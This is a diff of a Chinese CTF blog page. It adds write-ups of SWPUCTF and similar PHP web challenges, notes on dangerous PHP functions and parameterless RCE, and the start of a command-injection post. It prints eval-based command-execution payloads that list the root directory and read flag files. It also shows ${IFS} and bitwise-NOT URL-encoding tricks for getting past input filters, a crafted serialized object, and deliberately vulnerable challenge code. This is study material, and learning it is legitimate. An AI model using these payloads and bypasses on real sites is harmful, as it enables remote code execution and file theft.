@@ -69,10 +69,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-post2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-web复现1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/10/27/post2/" class="article-date">
-  <time class="dt-published" datetime="2024-10-27T10:28:13.760Z" itemprop="datePublished">2024-10-27</time>
+    <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/" class="article-date">
+  <time class="dt-published" datetime="2025-03-15T13:12:42.142Z" itemprop="datePublished">2025-03-15</time>
 </a>
     
   </div>
@@ -81,27 +81,95 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CTF入门"><a href="#CTF入门" class="headerlink" title="CTF入门"></a>CTF入门</h1><h2 id="CTF简介"><a href="#CTF简介" class="headerlink" title="CTF简介"></a>CTF简介</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。</p>
-<h2 id="CTF比赛模式"><a href="#CTF比赛模式" class="headerlink" title="CTF比赛模式"></a>CTF比赛模式</h2><ul>
-<li>解题模式（Jeopardy）：**在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</li>
-<li>攻防模式（Attack-Defense）：在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</li>
-<li>混合模式（Mix）：**结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛</li>
-</ul>
-<h2 id="CTF方向"><a href="#CTF方向" class="headerlink" title="CTF方向"></a>CTF方向</h2><ul>
-<li><p>WEB（web类）：WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始</p>
+        <h1 id="web-题解复现1"><a href="#web-题解复现1" class="headerlink" title="web 题解复现1"></a>web 题解复现1</h1><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 174550.png)</p>
+<p>首先进行代码审计</p>
+<p>发现了<strong>eval（）函数</strong>，<strong>eval（）函数</strong>是命令执行函数，常见的命令执行函数还有</p>
+<p><strong>system()</strong><br><strong>passthru()</strong><br><strong>exec()</strong><br><strong>shell_exec()</strong><br><strong>popen()</strong><br><strong>proc_open()</strong><br><strong>pcntl_exec()</strong></p>
+<p>直接使用system（）函数查看根目录下面有什么</p>
+<p>system（）函数的作用为执行系统命令并输出结果</p>
+<p>plyload:?url&#x3D;system(“ls%20&#x2F;“)；&#x2F;&#x2F;%20是空格的url编码</p>
+<p><strong>此处为什么要有空格</strong></p>
+<p>在命令执行的时候，空格是一个非常重要的分隔符，主要用于区分命令的不同组成部分，主要有四种用处</p>
+<ol>
+<li>分隔命令名称与参数</li>
+<li>分隔多个参数</li>
+<li>处理特殊字符的安全性</li>
+<li>影响某些特定功能的行为</li>
+</ol>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 175515.png)</p>
+<p>到这个这个页面，我们看到了一个疑似flag的文件，我们去尝试获取文件的所有内容</p>
+<p>payload：?url&#x3D;system(“cat%20&#x2F;flllllaaaaaaggggggg”);</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181146.png)</p>
+<p>这样我们就得到了这道题的flag</p>
+<h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181600.png)</p>
+<p>首先进行代码审计</p>
+<p>if的条件要求是$_COOKIE[‘admin’]是否等于1；我们先尝试着满足条件</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181909.png)</p>
+<p>此时回显了一个php文件，我们去访问它</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 182858.png)</p>
+<p>首先会看到preg_match()函数用于执行一个正则表达式匹配，搜素字符串与给定模式匹配的内容</p>
+<p>这行代码的意思是过滤了空格</p>
+<p>再往下看，看到了shell_exec()函数，考虑是命令执行</p>
+<p><strong>shell_exec()函数与exec（）函数的区别：</strong></p>
+<ol>
+<li><p>shell_exec（）函数<strong>返回值</strong>: 返回命令执行后的完整输出作为字符串。而exec（）函数<strong>返回值</strong>: 返回命令执行结果的最后一行输出，而不是整个输出。此外，它还可以通过引用参数获取输出的每一行和返回状态。</p>
+<p>IFS是一个特殊环境变量，叫做内部字段分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ls$&#123;IFS&#125;/</span><br></pre></td></tr></table></figure>
+
+<p>$ IFS$1(1可以换成其它的数字)$IFS$9,${IFS},$IFS,都能代替空格，</p>
+<p>payload：？url&#x3D;ls$IFS$9&#x2F;</p>
 </li>
-<li><p>MISC（安全杂项）：全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广</p>
-</li>
-<li><p>CRYPTO（密码学）：全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</p>
-</li>
-<li><p>REVERSE（逆向）：全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</p>
-</li>
-</ul>
+</ol>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 195817.png)</p>
+<p>然后我们就要获取文件里的内容，仍要注意不能使用空格</p>
+<p>payload: ?url&#x3D;cat${IFS}&#x2F;flllllaaaaaaggggggg</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 200036.png)</p>
+<p>最后得到flag</p>
+<h1 id="一道简单的反序列化"><a href="#一道简单的反序列化" class="headerlink" title="一道简单的反序列化"></a>一道简单的反序列化</h1><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 200956.png)</p>
+<p>首先进行代码审计，我们可以发现定义了一个名字叫Fun的类,变量fun创建了一个新的队形，变量ser是变量fun的反序列化，当传入的变量un和ser相等时，才会输出flag</p>
+<p>复制代码在本地运行，输出ser变量</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\c643f2a5aee7fd20d6377bbea91ff0e1.png" alt="c643f2a5aee7fd20d6377bbea91ff0e1"></p>
+<p>payload: ?un&#x3D;O:3:”Fun”:3:{s:4:”name”;s:5:”vFREE”;s:3:”age”;s:2:”19”;s:4:”look”;s:8:”handsome”;}</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 201542.png)</p>
+<p>这样就得到了flag</p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce-1"><a href="#SWPUCTF-2021-新生赛-hardrce-1" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure>
+
+<p>进行代码审计，可以发现代码过滤了一大堆的符号和字母</p>
+<p>还有eval语句</p>
+<p>对需要使用的函数进行取反，然后进行url编码，之所以使用取反操作，是因为取反操作基本上用的是不可见字符，所以不会触发正则匹配</p>
+<p>~进行取反操作，在php种urlencode（）函数用于对字符串进行url编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 分别取反，构造payload：?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C%DF%D0);</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\bd1baf0e2d3867582e9937cca4da2b31.png" alt="bd1baf0e2d3867582e9937cca4da2b31"></p>
+<p>相同的道理将获取文件内容同样取反</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</p>
+<p>最后得到flag</p>
+<h1 id="strlen-intval绕过"><a href="#strlen-intval绕过" class="headerlink" title="strlen+intval绕过"></a>strlen+intval绕过</h1><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 203147.png)</p>
+<p>进行代码审计, PHP 中，<code>intval()</code> 函数用于将变量转换为整数类型。它会尝试从给定的变量中提取一个整数值，并根据需要进行类型转换。</p>
+<p>strlen（）函数是求长度的函数</p>
+<p>这道题需要满足的条件是num的长度小于等于四，并且num+1经过intval（）处理后大于500000</p>
+<p>这里可以使用到科学计数法，5e5表示5乘10的5次方</p>
+<p>payload：?num&#x3D;5e5;</p>
+<h1 id="rec-eval执行"><a href="#rec-eval执行" class="headerlink" title="rec eval执行"></a>rec eval执行</h1><p><img src="C:\Users\21649\AppData\Local\Temp\d11182321d3620cd3a7f11e2cf6df8e5.png" alt="d11182321d3620cd3a7f11e2cf6df8e5"></p>
+<p>进行代码审计，看eval（）函数，考虑命令执行</p>
+<p>payload：&#x2F;?cmd&#x3D;system(“ls &#x2F;“);</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png" alt="49fbc4fcf55d90dab1243eb24a7abcf3"></p>
+<p>然后获取文件的内容</p>
+<p>payload：&#x2F;?cmd&#x3D;system(“cat &#x2F;flag_1203”);		</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png" alt="49fbc4fcf55d90dab1243eb24a7abcf3"></p>
+<h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p><img src="C:\Users\21649\AppData\Local\Temp\ec0e39ea1f32223a508857a03345dc77.png" alt="ec0e39ea1f32223a508857a03345dc77"></p>
+<p>使用bp抓包，把请求头改为CTFHUB</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>用bp抓包之后，发现了admin&#x3D;0</p>
+<p>0（false）1（true）</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\17c6161dbbf9b07fbcaa19aa123c45e0.png" alt="17c6161dbbf9b07fbcaa19aa123c45e0"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/27/post2/" data-id="cm2rg6isw0000qgvq3uqihdyx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/03/15/web%E5%A4%8D%E7%8E%B01/" data-id="cm8a8wwbc0007mcvqbr95gpqy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -113,10 +181,10 @@
 
 
   
-    <article id="post-CTF入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-危险函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/10/27/CTF%E5%85%A5%E9%97%A8/" class="article-date">
-  <time class="dt-published" datetime="2024-10-27T10:21:54.606Z" itemprop="datePublished">2024-10-27</time>
+    <a href="/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" class="article-date">
+  <time class="dt-published" datetime="2024-12-26T13:02:29.511Z" itemprop="datePublished">2024-12-26</time>
 </a>
     
   </div>
@@ -125,27 +193,22 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CTF入门"><a href="#CTF入门" class="headerlink" title="CTF入门"></a>CTF入门</h1><h2 id="CTF简介"><a href="#CTF简介" class="headerlink" title="CTF简介"></a>CTF简介</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。</p>
-<h2 id="CTF比赛模式"><a href="#CTF比赛模式" class="headerlink" title="CTF比赛模式"></a>CTF比赛模式</h2><ul>
-<li>解题模式（Jeopardy）：**在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</li>
-<li>攻防模式（Attack-Defense）：在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</li>
-<li>混合模式（Mix）：**结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛</li>
-</ul>
-<h2 id="CTF方向"><a href="#CTF方向" class="headerlink" title="CTF方向"></a>CTF方向</h2><ul>
-<li><p>WEB（web类）：WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始</p>
-</li>
-<li><p>MISC（安全杂项）：全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广</p>
-</li>
-<li><p>CRYPTO（密码学）：全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</p>
-</li>
-<li><p>REVERSE（逆向）：全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</p>
-</li>
-</ul>
+        <h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><p><strong>❑system()：</strong>输出并返回最后一行Shell结果。<br>**❑passthru()**：只调用命令，把命令的运行结果原样地直接输出到标准<br>输出设备上。它和system()函数都可以获得命令执行的状态码。<br>**❑exec()**：不输出结果，只返回最后一行Shell结果，所有结果可以保存<br>到一个返回的数组里面。<br><strong>❑popen（）</strong>：打开一个进程管道来执行给定的命令，返回一个文件句柄。由于返回的是一个文件句柄，因此可以对它进行读和写。在PHP3中，对这种句柄只能做单一的操作，要么写，要么读；从PHP4开始，可以对其同时进行读和写。除非这个句柄是以一种模式（读或写）打<br>开的，否则必须调用pclose()函数来关闭它。<br>**❑proc_open()**：执行一个命令，并且打开用于输入&#x2F;输出的文件指针。<br><strong>❑move_uploaded_file()：</strong>将上传的文件移动到新位置。<br>**❑eval()**：把字符串作为PHP代码执行。<br>**❑copy()**：拷贝文件。<br>**❑shell_exec()**：通过shell环境执行命令，并且以字符串的方式返回完整<br>的输出。<br><strong>❑assert（$assertion [, string $description]）</strong>：检查一个断言是否为FALSE。如果assertion是字符串，它将被assert()当作PHP代码来执行</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-26 191528.png)</p>
+<p>上面的是LINUX平台常用命令的执行格式。</p>
+<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>实际上就是通过调用函数得到想要的字符指令的过程</p>
+<p>❑$_POST<br>❑$_GET<br>❑$_FILES<br>❑$_ENV<br>❑$_cookie<br>❑$_session</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="string">&#x27;code&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*W\s]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>)) ;<span class="comment">//使用函数尝试从变量中移除所有的换行符，空格，制表符，和/*。如果最后的结果是；，则进行内部条件块</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no,wayyyyy!!!!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no ,wayy!!!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-getallheaders-和apache-request-headers"><a href="#1-getallheaders-和apache-request-headers" class="headerlink" title="1.getallheaders()和apache_request_headers()"></a>1.getallheaders()和apache_request_headers()</h2><p>getallheaders()是Apache中间件函数，可以用来获取HTTP请求头部<br>（header）中的所有变量信息（例如User-Agent）。<br>apache_request_headers()是getallheaders()的别名函数，二者的效果一致。我们可以在header中增加一些自定义的字段，同时在字段值部分指定想要执行的指令。例如，test:system（ls）表示在header中增加了test<br>字段，其值为system（ls）。此时，如果执行getallheaders()，则可以得到一个包含test字段和其值的结果。我们可以将该自定义字段添加在特定位置（例如header的头部或尾部），然后执行指令。将自定义字段添<br>加到特定位置是为了方便通过其他函数进行调取。例如，我们如果将test添加在header的尾部，那么就可以使用**end()<strong>函数直接获取test的值；<br>如果将test添加在header的首部，就可以使用</strong>pos()**函数获取test的值。</p>
+<h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>该函数属于通用函数，可以用于回显所有的变量信息</p>
+<p>主要包括</p>
+<p>❑$_GET<br>❑$_POST<br>❑$_FILES<br>❑$_cookie</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/27/CTF%E5%85%A5%E9%97%A8/" data-id="cm2rfytv00000iwvq557u8pdu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" data-id="cm8a8wwbd0009mcvq4863hkyb" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -157,10 +220,10 @@
 
 
   
-    <article id="post-我的第一篇博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/10/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time class="dt-published" datetime="2024-10-27T09:02:13.787Z" itemprop="datePublished">2024-10-27</time>
+    <a href="/2024/12/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time class="dt-published" datetime="2024-12-26T08:15:28.261Z" itemprop="datePublished">2024-12-26</time>
 </a>
     
   </div>
@@ -169,113 +232,488 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><ul>
-<li>在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</li>
-</ul>
-<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 172052.png)</p>
+        <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h2><h3 id="1-preg-replace"><a href="#1-preg-replace" class="headerlink" title="1.preg_replace()"></a>1.preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(pattern, replacement, subject, limit = -<span class="number">1</span>, &amp;count = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/hello/&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&#x27;hello world, hello everyone!&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出：hi world, hi everyone!</span></span><br></pre></td></tr></table></figure>
+
